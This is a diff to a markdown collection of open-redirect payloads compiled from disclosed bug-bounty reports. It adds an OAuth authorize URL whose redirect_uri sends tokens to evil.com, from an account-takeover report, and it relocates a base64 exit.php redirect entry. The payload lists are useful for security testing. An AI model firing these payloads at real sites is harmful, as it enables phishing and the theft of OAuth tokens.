@@ -1,6 +1,6 @@
 # Open Redirect
 
-139 payloads from disclosed reports.
+140 payloads from disclosed reports.
 
 ## Open redirect by supplying a malicious URL in the 'url' query parameter
 
@@ -775,6 +775,27 @@ https://target.com/auth/post-login?redirect=/..//evil.com
 — [Bypass of Open Redirect Fix on lovable.dev via /..// Path Traversal in redirect parameter](https://hackerone.com/reports/3599248) · Lovable VDP · [marioniangi](https://hackerone.com/marioniangi)
 
 
+## Open redirect by supplying an unvalidated 'url' parameter (base64‑encoded target) to exit.php
+
+### `c9992da1`
+
+```
+https://target.com/site/oauth2/authorize?client_id=b9jLmh8WCLZPBAwWba&redirect_uri=https%3A%2F%2Fevil.com%2Fusers%2Fauth%2Fbitbucket%2Fcallback&response_type=token&state=DoesNotMatter
+```
+
+**Parameter:** `redirect_uri`
+— [Account takeover due to insufficient URL validation on RelayState parameter](https://hackerone.com/reports/1923672) · GitLab · [bull](https://hackerone.com/bull) · $2,450.0
+
+### `3ed5382d`
+
+```
+https://target.com/exit.php?url=aHR0cHM6Ly9nb29nbGUuY29t
+```
+
+**Parameter:** `url`
+— [Open redirect in Serendipity (exit.php)](https://hackerone.com/reports/373932) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)
+
+
 ## Open‑redirect via unsafe_link parameter containing a malicious URL
 
 ### `3fa05ed6`
@@ -1362,18 +1383,6 @@ https://evil.com//evil2.com/
 ```
 
 — [\[target.com / evil.com\] Open Redirect](https://hackerone.com/reports/163124) · Skyliner · [bobrov](https://hackerone.com/bobrov)
-
-
-## Open redirect by supplying an unvalidated 'url' parameter (base64‑encoded target) to exit.php
-
-### `3ed5382d`
-
-```
-https://target.com/exit.php?url=aHR0cHM6Ly9nb29nbGUuY29t
-```
-
-**Parameter:** `url`
-— [Open redirect in Serendipity (exit.php)](https://hackerone.com/reports/373932) · Hanno's projects · [bb9866f3f743d6bf69b6836](https://hackerone.com/bb9866f3f743d6bf69b6836)
 
 
 ## Open redirect by supplying userinfo (username) before @ in callback_url
